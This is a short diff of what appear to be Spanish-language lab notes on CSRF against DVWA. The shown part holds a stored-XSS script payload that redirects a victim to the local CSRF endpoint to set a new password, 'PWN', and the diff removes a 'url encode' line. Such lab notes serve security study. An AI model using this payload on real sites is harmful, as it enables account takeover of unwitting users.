@@ -392,7 +392,6 @@ csrf.html
 
 2- Redirigir a la víctima mediante un XSS stored
 <script>document.location='http://127.0.0.1/vulnerabilities/csrf/?password_new=PWN&password_conf=PWN&Change=Change#';</script>%
-url encode
 
 
 
